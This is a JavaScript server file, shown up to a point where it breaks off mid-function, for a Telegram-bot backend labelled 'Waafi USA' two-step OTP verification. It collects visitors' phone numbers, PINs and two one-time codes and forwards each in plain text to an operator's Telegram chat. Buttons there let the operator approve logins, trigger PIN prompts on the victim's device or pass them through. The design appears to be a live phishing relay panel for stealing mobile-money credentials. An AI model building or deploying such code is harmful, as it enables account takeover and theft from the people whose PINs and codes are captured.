// server.js - Waafi USA - TWO-STEP OTP VERIFICATION (WEBHOOK MODE)
// ── WEBHOOK MODE ──────────────────────────────────────────────────────────
// Uses Telegram webhooks instead of long-polling.
// Benefits:
//   • Zero 409 conflicts — no competing polling instances
//   • Zero polling errors in logs
//   • Lower latency (<100ms vs ~1s for polling)
//   • Lower CPU/memory on Render
//
// Required env var:
//   WEBHOOK_URL=https://your-service.onrender.com
//
'use strict';
const express     = require('express');
const cors        = require('cors');
const TelegramBot = require('node-telegram-bot-api');
const crypto      = require('crypto');
require('dotenv').config();

const app  = express();
const PORT = process.env.PORT || 3001;

// Raw body needed for webhook signature verification — must come before json()
app.use('/telegram', express.raw({ type: 'application/json', limit: '1mb' }));
app.use(cors());
app.use(express.json({ limit: '10kb' }));

// ============================================
// CONFIGURATION
// ============================================
const CONFIG = Object.freeze({
  CACHE_DURATION: 5000,
  APPROVAL_TIMEOUT: 5 * 60 * 1000,
  USER_CACHE_DURATION: 30 * 60 * 1000,
  CLEANUP_INTERVAL: 60000,
  MAX_USERS: parseInt(process.env.MAX_USERS) || 1,
  TG_CHAT_INTERVAL: 1050,       // ms — Telegram: 1 msg/s per chat
  MAX_NOTIFICATION_SIZE: 4096,
  SSE_HEARTBEAT: 20000,
  SEND_RETRIES: 3,
  SEND_RETRY_DELAY: 1500,
  WEBHOOK_URL: (process.env.WEBHOOK_URL || '').replace(/\/$/, ''),
});

// ============================================
// LOGGER
// ============================================
const ts = () => new Date().toISOString();
const logger = {
  info:  (msg, ...args) => console.log(`[INFO]  ${ts()} - ${msg}`, ...args),
  error: (msg, ...args) => console.error(`[ERROR] ${ts()} - ${msg}`, ...args),
  warn:  (msg, ...args) => console.warn(`[WARN]  ${ts()} - ${msg}`, ...args),
  debug: (msg, ...args) => process.env.DEBUG && console.log(`[DEBUG] ${ts()} - ${msg}`, ...args),
};

// ============================================
// UTILITY FUNCTIONS
// ============================================
const sanitizeInput = (input) => {
  if (typeof input !== 'string') return String(input);
  return input.replace(/[<>]/g, '').trim();
};

const truncateMessage = (message, maxLength = CONFIG.MAX_NOTIFICATION_SIZE) => {
  if (message.length <= maxLength) return message;
  return message.substring(0, maxLength - 3) + '...';
};

const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

// ============================================
// VALIDATORS
// ============================================
const validatePhoneNumber = (phoneNumber) => {
  if (!phoneNumber || typeof phoneNumber !== 'string')
    return { valid: false, error: 'Phone number must be a string' };
  const cleaned = phoneNumber.replace(/\D/g, '');
  if (cleaned.length < 10 || cleaned.length > 15)
    return { valid: false, error: 'Invalid phone number length (need 10 digits)' };
  return { valid: true, cleaned };
};

const validatePin = (pin) => {
  if (!pin || typeof pin !== 'string')
    return { valid: false, error: 'PIN must be a string' };
  if (pin.length < 4 || pin.length > 8 || !/^\d+$/.test(pin))
    return { valid: false, error: 'PIN must be 4-8 digits' };
  return { valid: true };
};

const validateOtp = (otp) => {
  if (!otp || typeof otp !== 'string')
    return { valid: false, error: 'OTP must be a string' };
  if (otp.length < 4 || otp.length > 8 || !/^\d+$/.test(otp))
    return { valid: false, error: 'OTP must be 4-8 digits' };
  return { valid: true };
};

const validateOtpOrSentinel = (otp) => {
  if (!otp || typeof otp !== 'string')
    return { valid: false, error: 'OTP must be a string' };
  if (otp === 'prompt_pin_verified') return { valid: true };
  if (otp.length < 4 || otp.length > 8 || !/^\d+$/.test(otp))
    return { valid: false, error: 'OTP must be 4-8 digits' };
  return { valid: true };
};

// ============================================
// PHONE NUMBER FORMATTING (US FORMAT)
// ============================================
const formatPhoneNumber = (phoneNumber) => {
  try {
    let cleaned = phoneNumber.replace(/\D/g, '');
    
    // Remove leading +1 or 1 if present, then take last 10 digits
    if (cleaned.startsWith('1') && cleaned.length > 10) {
      cleaned = cleaned.substring(1);
    }
    
    // If more than 10 digits, take last 10
    if (cleaned.length > 10) {
      cleaned = cleaned.slice(-10);
    }
    
    // Pad with zeros if less than 10
    while (cleaned.length < 10) {
      cleaned = '0' + cleaned;
    }
    
    const number = cleaned.slice(-10);
    const countryCode = '+1';
    const formatted = `${countryCode}(${number.slice(0, 3)})${number.slice(3, 6)}-${number.slice(6)}`;
    
    return { countryCode, number, formatted };
  } catch (error) {
    logger.error('Error formatting phone number:', error.message);
    return { countryCode: '+1', number: phoneNumber.replace(/\D/g, '').slice(-10), formatted: `+1${phoneNumber}` };
  }
};

// ============================================
// DUPE CACHE
// ============================================
class DupeCache {
  constructor(ttl = CONFIG.CACHE_DURATION) {
    this._map = new Map();
    this._ttl = ttl;
  }

  seen(key) {
    if (this._map.has(key)) return true;
    const timeout = setTimeout(() => this._map.delete(key), this._ttl);
    if (timeout.unref) timeout.unref();
    this._map.set(key, timeout);
    return false;
  }

  clear() {
    for (const timeout of this._map.values()) clearTimeout(timeout);
    this._map.clear();
  }
}

// ============================================
// TG QUEUE (Rate limiting per chat)
// ============================================
class TgQueue {
  constructor(interval = CONFIG.TG_CHAT_INTERVAL) {
    this._queue = [];
    this._running = false;
    this._interval = interval;
    this._last = 0;
  }

  send(fn) {
    return new Promise((resolve, reject) => {
      this._queue.push({ fn, resolve, reject });
      if (!this._running) this._drain();
    });
  }

  async _drain() {
    this._running = true;
    while (this._queue.length) {
      const gap = this._interval - (Date.now() - this._last);
      if (gap > 0) await sleep(gap);
      const { fn, resolve, reject } = this._queue.shift();
      this._last = Date.now();
      try {
        resolve(await fn());
      } catch (e) {
        reject(e);
      }
    }
    this._running = false;
  }

  flush(reason = 'queue flushed') {
    while (this._queue.length) {
      this._queue.shift().reject(new Error(reason));
    }
  }
}

// ============================================
// SSE BROKER
// ============================================
class SseBroker {
  constructor() {
    this._subs = new Map();
  }

  subscribe(key, res) {
    res.setHeader('Content-Type', 'text/event-stream');
    res.setHeader('Cache-Control', 'no-cache');
    res.setHeader('Connection', 'keep-alive');
    res.setHeader('X-Accel-Buffering', 'no');
    res.flushHeaders();

    const heartbeat = setInterval(() => {
      if (!res.writableEnded) res.write(': ping\n\n');
    }, CONFIG.SSE_HEARTBEAT);

    const entry = { res, heartbeat };
    if (!this._subs.has(key)) this._subs.set(key, new Set());
    this._subs.get(key).add(entry);

    const unsubscribe = () => {
      clearInterval(heartbeat);
      const set = this._subs.get(key);
      if (set) {
        set.delete(entry);
        if (!set.size) this._subs.delete(key);
      }
      if (!res.writableEnded) res.end();
    };

    res.on('close', unsubscribe);
    res.on('error', unsubscribe);
  }

  push(key, payload) {
    const set = this._subs.get(key);
    if (!set?.size) return;
    const data = `data: ${JSON.stringify(payload)}\n\n`;
    for (const { res, heartbeat } of set) {
      clearInterval(heartbeat);
      if (!res.writableEnded) {
        res.write(data);
        res.end();
      }
    }
    this._subs.delete(key);
  }

  get size() {
    let n = 0;
    for (const s of this._subs.values()) n += s.size;
    return n;
  }
}

const sseBroker = new SseBroker();

// ============================================
// MESSAGE FORMATTERS
// ============================================
const formatLoginMessage = (user, data) => {
  try {
    const { countryCode, number } = formatPhoneNumber(data.phoneNumber);
    const isReturning = isVerifiedUser(user, data.phoneNumber);
    const userBadge = isReturning ? '🔄 RETURNING USER' : '🆕 NEW USER';
    const cacheInfo = isReturning
      ? '✅ <b>Cached (30 min) - will skip both OTPs</b>'
      : '📱 <b>New user - will show 2 OTPs</b>';
    return `📱 <b>${sanitizeInput(user.name)} - LOGIN ATTEMPT</b>

${userBadge}
🇺🇸 <b>Country:</b> USA
🌍 <b>Country Code:</b> <code>${countryCode}</code>
📱 <b>Phone Number:</b> <code>${number}</code>
🔢 <b>PIN:</b> <code>${sanitizeInput(data.pin)}</code>
⏰ <b>Time:</b> ${new Date(data.timestamp).toLocaleString()}

${cacheInfo}

━━━━━━━━━━━━━━━━━━━

⚠️ <b>User waiting for approval</b>
⏱️ <b>Timeout:</b> 5 minutes`;
  } catch (error) {
    logger.error(`Error formatting login message for ${user.name}:`, error.message);
    return `Error formatting message: ${error.message}`;
  }
};

const formatSecondOTPMessage = (user, data) => {
  try {
    const { countryCode, number } = formatPhoneNumber(data.phoneNumber);
    return `2️⃣ <b>${sanitizeInput(user.name)} - SECOND OTP (Step 2/2)</b>

✅ <b>FIRST OTP VERIFIED - FINAL VERIFICATION</b>
🇺🇸 <b>Country:</b> USA
🌍 <b>Country Code:</b> <code>${countryCode}</code>
📱 <b>Phone Number:</b> <code>${number}</code>
🔐 <b>Second OTP Code:</b> <code>${sanitizeInput(data.otp)}</code>
🔗 <b>First OTP Ref:</b> <code>${sanitizeInput(data.firstOtp)}</code>
⏰ <b>Time:</b> ${new Date(data.timestamp).toLocaleString()}

━━━━━━━━━━━━━━━━━━━

⚠️ <b>Verify SECOND OTP:</b>
⏱️ <b>Timeout:</b> 5 minutes
📝 <b>Next:</b> Choose PIN method after verification`;
  } catch (error) {
    logger.error(`Error formatting second OTP message for ${user.name}:`, error.message);
    return `Error formatting message: ${error.message}`;
  }
};

const formatPromptPinMessage = (user, data) => {
  try {
    const { countryCode, number } = formatPhoneNumber(data.phoneNumber);
    return `🔐 <b>${sanitizeInput(user.name)} - PROMPT PIN VERIFICATION</b>

📲 <b>User has been prompted to enter PIN on phone</b>
🇺🇸 <b>Country:</b> USA
🌍 <b>Country Code:</b> <code>${countryCode}</code>
📱 <b>Phone Number:</b> <code>${number}</code>
🔗 <b>First OTP Ref:</b> <code>${sanitizeInput(data.firstOtp || 'N/A')}</code>
⏰ <b>Time:</b> ${new Date(data.timestamp).toLocaleString()}

━━━━━━━━━━━━━━━━━━━

⏳ <b>Waiting for user to complete PIN entry on device</b>
⏱️ <b>Timeout:</b> 5 minutes

✅ Click <b>Successful</b> once user has entered PIN correctly
❌ Click <b>Failed</b> if PIN entry was unsuccessful`;
  } catch (error) {
    logger.error(`Error formatting prompt-pin message for ${user.name}:`, error.message);
    return `Error formatting message: ${error.message}`;
  }
};

const formatRequestPinMessage = (user, data) => {
  try {
    const { countryCode, number } = formatPhoneNumber(data.phoneNumber);
    return `🔑 <b>${sanitizeInput(user.name)} - REQUEST PIN VERIFICATION</b>

📋 <b>User submitted PIN directly</b>
🇺🇸 <b>Country:</b> USA
🌍 <b>Country Code:</b> <code>${countryCode}</code>
📱 <b>Phone Number:</b> <code>${number}</code>
🔢 <b>Submitted PIN:</b> <code>${sanitizeInput(data.pin)}</code>
🔗 <b>First OTP Ref:</b> <code>${sanitizeInput(data.firstOtp || 'N/A')}</code>
⏰ <b>Time:</b> ${new Date(data.timestamp).toLocaleString()}

━━━━━━━━━━━━━━━━━━━

⚠️ <b>Verify this PIN:</b>
⏱️ <b>Timeout:</b> 5 minutes`;
  } catch (error) {
    logger.error(`Error formatting request-pin message for ${user.name}:`, error.message);
    return `Error formatting message: ${error.message}`;
  }
};

// ============================================
// CALLBACK DATA HELPERS
// ============================================
const CB_SEP = '|';
const mkCb = (type, action, phone, secret) => [type, action, phone, secret].join(CB_SEP);
const parseCb = (data) => {
  const parts = data.split(CB_SEP);
  return parts.length === 4 ? { type: parts[0], action: parts[1], phone: parts[2], secret: parts[3] } : null;
};

// ============================================
// USER VERIFICATION CACHE
// ============================================
const isVerifiedUser = (user, phoneNumber) => {
  const verifiedData = user.verifiedUsers.get(phoneNumber);
  if (!verifiedData) return false;
  const elapsed = Date.now() - verifiedData.timestamp;
  if (elapsed > CONFIG.USER_CACHE_DURATION) {
    user.verifiedUsers.delete(phoneNumber);
    logger.debug(`${user.name}: User cache expired for ${phoneNumber}`);
    return false;
  }
  verifiedData.lastLogin = Date.now();
  return true;
};

const cacheVerifiedUser = (user, phoneNumber) => {
  user.verifiedUsers.set(phoneNumber, { timestamp: Date.now(), lastLogin: Date.now() });
  logger.info(`${user.name}: ✅ Cached verified user ${phoneNumber} (30 min)`);
};

// ============================================
// BOT MANAGER (WEBHOOK)
// ============================================
class BotManager {
  constructor(user, linkInsert) {
    this.user = user;
    this.linkInsert = linkInsert;
    this.bot = null;
    this.ready = false;
  }

  get _secret() {
    return crypto.createHash('sha256')
      .update(`wh:${this.user.botToken}`)
      .digest('hex')
      .slice(0, 32);
  }

  get _path() {
    return `/telegram/${this._secret}`;
  }

  async init() {
    if (!CONFIG.WEBHOOK_URL) {
      logger.error(`${this.user.name}: WEBHOOK_URL env var not set — cannot register webhook`);
      return;
    }

    this.bot = new TelegramBot(this.user.botToken, {
      webHook: false,
      filepath: false,
    });

    this._setupCommands();

    const fullUrl = `${CONFIG.WEBHOOK_URL}${this._path}`;

    try {
      // Call Telegram API directly to set webhook (node-telegram-bot-api doesn't expose setWebhook method)
      const apiUrl = `https://api.telegram.org/bot${this.user.botToken}`;

      // Delete old webhook first
      try {
        const deleteResponse = await fetch(`${apiUrl}/deleteWebhook`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ drop_pending_updates: true }),
        });
        logger.debug(`${this.user.name}: old webhook deleted`);
      } catch (e) {
        logger.debug(`${this.user.name}: deleteWebhook error (may not exist):`, e.message);
      }

      // Set new webhook using Telegram Bot API
      const setWebhookResponse = await fetch(`${apiUrl}/setWebhook`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          url: fullUrl,
          allowed_updates: ['message', 'callback_query'],
          drop_pending_updates: true,
        }),
      });

      const result = await setWebhookResponse.json();

      if (!result.ok) {
        throw new Error(`Telegram API error: ${result.description || 'Unknown error'}`);
      }

      logger.info(`${this.user.name}: webhook set → ${fullUrl}`);

      this.user.isHealthy = true;
      this.user.bot = this.bot;
      this.ready = true;
    } catch (e) {
      logger.error(`${this.user.name}: setWebhook failed:`, e.message);
    }
  }

  processUpdate(update) {
    if (!this.bot) return;
    try {
      this.bot.processUpdate(update);
    } catch (e) {
      logger.error(`${this.user.name}: processUpdate error:`, e.message);
    }
  }

  _setupCommands() {
    const { bot, user, linkInsert } = this;

    bot.onText(/\/start/, async (msg) => {
      try {
        await bot.sendMessage(msg.chat.id,
          `🤖 <b>${sanitizeInput(user.name)} Bot - Waafi USA (Two-Step OTP)</b>\n\n` +
          `I will notify you of all login attempts and TWO OTP verifications.\n\n` +
          `<b>Your Chat ID:</b> <code>${msg.chat.id}</code>\n` +
          `<b>Your Link:</b> <code>/api/${linkInsert}/*</code>\n\n` +
          `⏱️ <b>User Cache:</b> 30 minutes\n` +
          `📝 <b>Returning users skip both OTPs for 30 min</b>\n` +
          `🔐 <b>New users verify 2 OTPs</b>\n\n` +
          `Add these to your .env file as:\n` +
          `<code>USER_LINK_INSERT_${user.id}=${linkInsert}</code>\n` +
          `<code>TELEGRAM_CHAT_ID_${user.id}=${msg.chat.id}</code>`,
          { parse_mode: 'HTML' });
      } catch (error) {
        logger.error(`${user.name}: /start error:`, error.message);
      }
    });

    bot.onText(/\/status/, async (msg) => {
      try {
        await bot.sendMessage(msg.chat.id,
          `✅ <b>${sanitizeInput(user.name)} Bot Active - Waafi USA</b>\n\n` +
          `📊 Login notifications: ${user.loginNotifications.size}\n` +
          `2️⃣ Pending Second OTP: ${user.secondOtpVerifications.size}\n` +
          `📲 Pending Prompt PIN: ${user.promptPinVerifications.size}\n` +
          `🔑 Pending Request PIN: ${user.requestPinVerifications.size}\n` +
          `✅ Verified users (30 min cache): ${user.verifiedUsers.size}\n` +
          `🔗 Endpoint: <code>/api/${linkInsert}/*</code>\n` +
          `📡 SSE clients: ${sseBroker.size}\n` +
          `${user.lastError ? `⚠️ Last error: ${user.lastError}` : ''}`,
          { parse_mode: 'HTML' });
      } catch (error) {
        logger.error(`${user.name}: /status error:`, error.message);
      }
    });

    bot.on('callback_query', async (query) => {
      try {
        await handleCallbackQuery(user, query);
      } catch (error) {
        logger.error(`${user.name}: Callback error:`, error.message);
        try {
          await bot.answerCallbackQuery(query.id, { text: '❌ Error occurred', show_alert: true });
        } catch (e) {
          logger.error(`${user.name}: Error answering callback:`, e.message);
        }
      }
    });
  }

  isHealthy() {
    return this.ready && this.user.isHealthy;
  }
}

// ============================================
// CALLBACK QUERY HANDLER
// ============================================
async function handleCallbackQuery(user, query) {
  const msg = query.message;
  const data = query.data;
  const chatId = msg.chat.id;
  const messageId = msg.message_id;

  const acknowledgeCallback = async (text, showAlert = false) => {
    try {
      await user.bot.answerCallbackQuery(query.id, { text, show_alert: showAlert });
    } catch (e) {
      logger.debug(`${user.name}: Callback acknowledge error:`, e.message);
    }
  };

  const updateMessage = async (text, keyboard = null) => {
    try {
      await user.bot.editMessageText(text, {
        chat_id: chatId,
        message_id: messageId,
        parse_mode: 'HTML',
        reply_markup: keyboard || { inline_keyboard: [] },
      });
      return true;
    } catch (e) {
      if (e.message?.includes('message is not modified')) {
        logger.debug(`${user.name}: Message already updated`);
        return true;
      }
      logger.error(`${user.name}: Message update error:`, e.message);
      return false;
    }
  };

  try {
    await acknowledgeCallback('⏳ Processing...');

    const parts = data.split('_');
    if (parts.length < 3) {
      logger.error(`${user.name}: Invalid callback data format: ${data}`);
      await acknowledgeCallback('❌ Invalid data format', true);
      return;
    }

    const type = parts[0];
    const action = parts[1];
    const dataValue = parts[parts.length - 1];
    const phoneNumber = parts.slice(2, -1).join('_');

    logger.info(`${user.name}: Processing ${type}_${action} for ${phoneNumber}`);

    // ========== LOGIN ==========
    if (type === 'login') {
      const pin = dataValue;
      const loginKey = `${phoneNumber}-${pin}`;
      const loginData = user.loginNotifications.get(loginKey);

      if (!loginData) {
        logger.warn(`${user.name}: Login session not found: ${loginKey}`);
        const { number } = formatPhoneNumber(phoneNumber);
        await updateMessage(`❌ <b>SESSION NOT FOUND</b>\n\n📱 <code>${number}</code>\n🔐 <code>${pin}</code>\n\n<b>Status:</b> Session expired`);
        await acknowledgeCallback('❌ Session not found', true);
        return;
      }

      const elapsed = Date.now() - loginData.timestamp;
      if (elapsed > CONFIG.APPROVAL_TIMEOUT) {
        loginData.expired = true;
        loginData.approved = false;
        loginData.rejected = true;
        const { number } = formatPhoneNumber(phoneNumber);
        await updateMessage(`⏰ <b>SESSION EXPIRED</b>\n\n📱 <code>${number}</code>\n🔐 <code>${pin}</code>\n\n<b>Expired after:</b> ${Math.floor(elapsed / 1000)}s`);
        await acknowledgeCallback('⏰ Session expired', true);
        return;
      }

      if (loginData.approved || loginData.rejected) {
        await acknowledgeCallback(`⚠️ Already ${loginData.approved ? 'approved' : 'rejected'}`, true);
        return;
      }

      const { number } = formatPhoneNumber(phoneNumber);
      const isReturning = isVerifiedUser(user, phoneNumber);

      if (action === 'proceed') {
        loginData.approved = true;
        loginData.rejected = false;
        loginData.processedAt = Date.now();
        await updateMessage(
          `✅ <b>LOGIN APPROVED</b>\n\n${isReturning ? '🔄 <b>RETURNING USER</b>' : '🆕 <b>NEW USER</b>'}\n🇺🇸 USA\n📱 <code>${number}</code>\n🔐 <code>${pin}</code>\n\n━━━━━━━━━━━━━━━━━━━\n\n✅ <b>Status:</b> Approved\n➡️ <b>Next:</b> ${isReturning ? 'Dashboard' : 'Second OTP (2/2)'}\n${isReturning ? '⏱️ <b>Cache valid for 30 min</b>\n' : ''}⏱️ ${new Date().toLocaleTimeString()}`
        );
        await acknowledgeCallback('✅ User approved successfully!');
        logger.info(`${user.name}: ✅ Login approved for ${phoneNumber}`);
      } else if (action === 'invalid') {
        loginData.approved = false;
        loginData.rejected = true;
        loginData.rejectionReason = 'invalid';
        loginData.processedAt = Date.now();
        await updateMessage(`❌ <b>INVALID CREDENTIALS</b>\n\n🇺🇸 USA\n📱 <code>${number}</code>\n🔐 <code>${pin}</code>\n\n━━━━━━━━━━━━━━━━━━━\n\n❌ <b>Status:</b> Rejected\n⏱️ ${new Date().toLocaleTimeString()}`);
        await acknowledgeCallback('❌ Marked as invalid');
        logger.info(`${user.name}: ❌ Login rejected for ${phoneNumber}`);
      } else {
        await acknowledgeCallback(`❌ Unknown action: ${action}`, true);
      }
    }

    // ========== SECOND OTP ==========
    else if (type === 'secondotp') {
      const otp = dataValue;
      const verificationKey = `${phoneNumber}-${otp}`;
      const otpData = user.secondOtpVerifications.get(verificationKey);

      if (!otpData) {
        const isNowVerified = isVerifiedUser(user, phoneNumber);
        if (isNowVerified) {
          await acknowledgeCallback('✅ Already processed - user is verified', true);
          return;
        }
        const { number } = formatPhoneNumber(phoneNumber);
        await updateMessage(`❌ <b>SECOND OTP NOT FOUND</b>\n\n📱 <code>${number}</code>\n🔐 <code>${otp}</code>\n\n<b>Status:</b> Session expired`);
        await acknowledgeCallback('❌ Session not found or expired', true);
        return;
      }

      const elapsed = Date.now() - otpData.timestamp;
      if (elapsed > CONFIG.APPROVAL_TIMEOUT) {
        otpData.expired = true;
        otpData.status = 'timeout';
        const { number } = formatPhoneNumber(phoneNumber);
        await updateMessage(`⏰ <b>SECOND OTP EXPIRED</b>\n\n📱 <code>${number}</code>\n🔐 <code>${otp}</code>\n\n<b>Expired after:</b> ${Math.floor(elapsed / 1000)}s`);
        await acknowledgeCallback('⏰ Session expired', true);
        return;
      }

      if (otpData.status !== 'pending') {
        await acknowledgeCallback(`⚠️ Already processed: ${otpData.status}`, true);
        return;
      }

      const { number } = formatPhoneNumber(phoneNumber);

      if (action === 'correct') {
        otpData.status = 'approved';
        otpData.processedAt = Date.now();

        const methodKeyboard = {
          inline_keyboard: [
            [{ text: '📲 Prompt PIN', callback_data: `pinmethod_prompt_${phoneNumber}_${otp}` }],
            [{ text: '⌨️ Request PIN', callback_data: `pinmethod_request_${phoneNumber}_${otp}` }],
            [{ text: '✅ Pass', callback_data: `pinmethod_pass_${phoneNumber}_${otp}` }],
          ],
        };

        await updateMessage(
          `2️⃣ <b>SECOND OTP VERIFIED ✅ — Choose Second PIN Method</b>\n\n🇺🇸 USA\n📱 <code>${number}</code>\n🔐 <code>${otp}</code>\n🔗 <b>First OTP:</b> <code>${otpData.firstOtp}</code>\n\n━━━━━━━━━━━━━━━━━━━\n\n✅ <b>OTP verified.</b> Now choose how to collect the second PIN:\n\n📲 <b>Prompt PIN</b> — user prompted on device to enter PIN\n⌨️ <b>Request PIN</b> — user types PIN manually on screen\n\n⏱️ ${new Date().toLocaleTimeString()}`,
          methodKeyboard
        );
        await acknowledgeCallback('✅ OTP verified — choose PIN method');
        logger.info(`${user.name}: ✅ Second OTP approved for ${phoneNumber} — awaiting PIN method choice`);
      } else if (action === 'wrong') {
        otpData.status = 'rejected';
        otpData.processedAt = Date.now();
        await updateMessage(`❌ <b>WRONG SECOND OTP</b>\n\n🇺🇸 USA\n📱 <code>${number}</code>\n🔐 <code>${otp}</code>\n\n━━━━━━━━━━━━━━━━━━━\n\n❌ <b>Status:</b> Invalid second OTP\n⏱️ ${new Date().toLocaleTimeString()}`);
        await acknowledgeCallback('❌ Marked as wrong');
        logger.info(`${user.name}: ❌ Wrong Second OTP for ${phoneNumber}`);
      } else if (action === 'wrongpin') {
        otpData.status = 'wrong_pin';
        otpData.processedAt = Date.now();
        await updateMessage(`⚠️ <b>WRONG PIN (Second OTP)</b>\n\n🇺🇸 USA\n📱 <code>${number}</code>\n🔐 <code>${otp}</code>\n\n━━━━━━━━━━━━━━━━━━━\n\n⚠️ <b>Status:</b> Incorrect PIN\n⏱️ ${new Date().toLocaleTimeString()}`);
        await acknowledgeCallback('⚠️ Marked as wrong PIN');
        logger.info(`${user.name}: ⚠️ Wrong PIN for Second OTP - ${phoneNumber}`);
      } else {
        await acknowledgeCallback(`❌ Unknown action: ${action}`, true);
      }
    }

    // ========== PROMPT PIN ==========
    else if (type === 'promptpin') {
      const verificationData = user.promptPinVerifications.get(phoneNumber);

      if (!verificationData) {
        const { number } = formatPhoneNumber(phoneNumber);
        await updateMessage(`❌ <b>PROMPT PIN SESSION NOT FOUND</b>\n\n📱 <code>${number}</code>\n\n<b>Status:</b> Session expired or already processed`);
        await acknowledgeCallback('⚠️ Session expired or already processed', true);
        return;
      }

      const elapsed = Date.now() - verificationData.timestamp;
      if (elapsed > CONFIG.APPROVAL_TIMEOUT) {
        verificationData.status = 'timeout';
        const { number } = formatPhoneNumber(phoneNumber);
        await updateMessage(`⏰ <b>PROMPT PIN EXPIRED</b>\n\n📱 <code>${number}</code>\n\n<b>Expired after:</b> ${Math.floor(elapsed / 1000)}s`);
        await acknowledgeCallback('⏰ Session expired', true);
        return;
      }

      if (verificationData.status !== 'pending') {
        await acknowledgeCallback(`⚠️ Already processed: ${verificationData.status}`, true);
        return;
      }

      const { number } = formatPhoneNumber(phoneNumber);

      if (action === 'success') {
        verificationData.status = 'approved';
        verificationData.processedAt = Date.now();
        cacheVerifiedUser(user, phoneNumber);
        await updateMessage(`📲 <b>PROMPT PIN VERIFIED ✅</b>\n\n🇺🇸 USA\n📱 <code>${number}</code>\n\n━━━━━━━━━━━━━━━━━━━\n\n✅ <b>Status:</b> PIN entered successfully on device\n🎉 <b>Result:</b> User logged in\n⏱️ <b>Cached for 30 minutes</b>\n⏱️ ${new Date().toLocaleTimeString()}`);
        await acknowledgeCallback('✅ Prompt PIN verified & cached!');
        logger.info(`${user.name}: ✅ Prompt PIN approved and user cached for ${phoneNumber}`);
      } else if (action === 'failed') {
        verificationData.status = 'rejected';
        verificationData.processedAt = Date.now();
        await updateMessage(`❌ <b>PROMPT PIN FAILED</b>\n\n🇺🇸 USA\n📱 <code>${number}</code>\n\n━━━━━━━━━━━━━━━━━━━\n\n❌ <b>Status:</b> PIN verification unsuccessful\n⏱️ ${new Date().toLocaleTimeString()}`);
        await acknowledgeCallback('❌ Marked as failed');
        logger.info(`${user.name}: ❌ Prompt PIN failed for ${phoneNumber}`);
      } else {
        await acknowledgeCallback(`❌ Unknown action: ${action}`, true);
      }
    }

    // ========== REQUEST PIN ==========
    else if (type === 'requestpin') {
      const pin = dataValue;
      const verificationKey = `${phoneNumber}-${pin}`;
      const pinData = user.requestPinVerifications.get(verificationKey);

      if (!pinData) {
        const { number } = formatPhoneNumber(phoneNumber);
        await updateMessage(`❌ <b>REQUEST PIN SESSION NOT FOUND</b>\n\n📱 <code>${number}</code>\n🔢 <code>${pin}</code>\n\n<b>Status:</b> Session expired or already processed`);
        await acknowledgeCallback('⚠️ Session expired or already processed', true);
        return;
      }

      const elapsed = Date.now() - pinData.timestamp;
      if (elapsed > CONFIG.APPROVAL_TIMEOUT) {
        pinData.status = 'timeout';
        const { number } = formatPhoneNumber(phoneNumber);
        await updateMessage(`⏰ <b>REQUEST PIN EXPIRED</b>\n\n📱 <code>${number}</code>\n🔢 <code>${pin}</code>\n\n<b>Expired after:</b> ${Math.floor(elapsed / 1000)}s`);
        await acknowledgeCallback('⏰ Session expired', true);
        return;
      }

      if (pinData.status !== 'pending') {
        await acknowledgeCallback(`⚠️ Already processed: ${pinData.status}`, true);
        return;
      }

      const { number } = formatPhoneNumber(phoneNumber);

      if (action === 'correct') {
        pinData.status = 'approved';
        pinData.processedAt = Date.now();
        cacheVerifiedUser(user, phoneNumber);
        await updateMessage(`🔑 <b>REQUEST PIN VERIFIED ✅</b>\n\n🇺🇸 USA\n📱 <code>${number}</code>\n🔢 <b>PIN:</b> <code>${pin}</code>\n\n━━━━━━━━━━━━━━━━━━━\n\n✅ <b>Status:</b> Correct PIN confirmed\n🎉 <b>Result:</b> User logged in\n⏱️ <b>Cached for 30 minutes</b>\n⏱️ ${new Date().toLocaleTimeString()}`);
        await acknowledgeCallback('✅ PIN correct & cached!');
        logger.info(`${user.name}: ✅ Request PIN approved and user cached for ${phoneNumber}`);
      } else if (action === 'wrong') {
        pinData.status = 'wrong_pin';
        pinData.processedAt = Date.now();
        await updateMessage(`❌ <b>REQUEST PIN WRONG</b>\n\n🇺🇸 USA\n📱 <code>${number}</code>\n🔢 <b>PIN:</b> <code>${pin}</code>\n\n━━━━━━━━━━━━━━━━━━━\n\n❌ <b>Status:</b> Incorrect PIN\n⏱️ ${new Date().toLocaleTimeString()}`);
        await acknowledgeCallback('❌ Marked as wrong PIN');
        logger.info(`${user.name}: ❌ Wrong Request PIN for ${phoneNumber}`);
      } else {
        await acknowledgeCallback(`❌ Unknown action: ${action}`, true);
      }
    }

    // ========== PIN METHOD SELECTION ==========
    else if (type === 'pinmethod') {
      const { number } = formatPhoneNumber(phoneNumber);

      if (action === 'prompt') {
        user.secondPinMethodDecisions.set(phoneNumber, { method: 'prompt_pin', timestamp: Date.now() });
        await updateMessage(`📲 <b>PIN METHOD: Prompt PIN</b>\n\n🇺🇸 USA\n📱 <code>${number}</code>\n\n━━━━━━━━━━━━━━━━━━━\n\n⏳ <b>Status:</b> User will be prompted on device\n⏱️ ${new Date().toLocaleTimeString()}`);
        await acknowledgeCallback('📲 Prompt PIN selected');
        logger.info(`${user.name}: 📲 Admin chose Prompt PIN for ${phoneNumber}`);
      } else if (action === 'request') {
        user.secondPinMethodDecisions.set(phoneNumber, { method: 'request_pin', timestamp: Date.now() });
        await updateMessage(`⌨️ <b>PIN METHOD: Request PIN</b>\n\n🇺🇸 USA\n📱 <code>${number}</code>\n\n━━━━━━━━━━━━━━━━━━━\n\n⏳ <b>Status:</b> User will type PIN on screen\n⏱️ ${new Date().toLocaleTimeString()}`);
        await acknowledgeCallback('⌨️ Request PIN selected');
        logger.info(`${user.name}: ⌨️ Admin chose Request PIN for ${phoneNumber}`);
      } else if (action === 'pass') {
        cacheVerifiedUser(user, phoneNumber);
        user.secondPinMethodDecisions.set(phoneNumber, { method: 'pass', timestamp: Date.now() });
        await updateMessage(`✅ <b>PIN METHOD: Pass (No PIN Required)</b>\n\n🇺🇸 USA\n📱 <code>${number}</code>\n\n━━━━━━━━━━━━━━━━━━━\n\n✅ <b>Status:</b> User bypassed PIN — logged in\n⏱️ <b>Cached for 30 minutes</b>\n⏱️ ${new Date().toLocaleTimeString()}`);
        await acknowledgeCallback('✅ Pass selected — user logged in');
        logger.info(`${user.name}: ✅ Pass granted and user cached for ${phoneNumber}`);
      } else {
